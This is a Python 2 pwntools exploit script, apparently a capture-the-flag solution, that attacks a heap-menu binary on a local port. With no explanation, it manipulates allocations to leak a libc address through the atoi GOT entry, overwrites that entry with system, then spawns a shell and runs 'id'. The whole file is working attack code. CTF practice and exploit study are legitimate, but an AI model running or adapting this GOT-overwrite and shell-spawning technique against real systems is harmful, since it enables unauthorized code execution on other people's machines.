#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal



context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = '/root/input_elf'
#sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('127.0.0.1', 10005)
sh.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
elf = ELF(execve_file)
libc = ELF('/root/libc.so')

def alloc(index, size, content):
    sh.sendlineafter(': ', '1')
    sh.sendlineafter('Index: ', str(index))
    sh.sendlineafter('size: ', str(size))
    sh.sendafter('Content: ', content)

def edit(index, content):
    sh.sendlineafter(': ', '4')
    sh.sendlineafter('Index: ', str(index))
    sh.send(content)

def delete(index):
    sh.sendlineafter(': ', '3')
    sh.sendlineafter('Index: ', str(index))

def show(index):
    sh.sendlineafter(': ', '2')
    sh.sendlineafter('Index: ', str(index))

alloc(0, 0xfc0, '\n')
alloc(1, 0x10, '\0' * 0x10)
delete(1)
alloc(2, 0x28, p64(0x4040d0) + '\0' * 0x1f + '\n')
alloc(3, 0x23330fd0 - 0x10, p64(elf.got['atoi']) + '\n')
show(0)
result = sh.recvuntil('\n', drop=True)
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['atoi']
log.success('libc_addr: ' + hex(libc_addr))
edit(0, p64(libc_addr + libc.symbols['system']) + '\n')
sh.sendline('/bin/sh\0')


sleep(1)
sh.sendline("id")
sleep(1)
print sh.recv(timeout=5)
sleep(10)
sh.close
#sh.interactive()
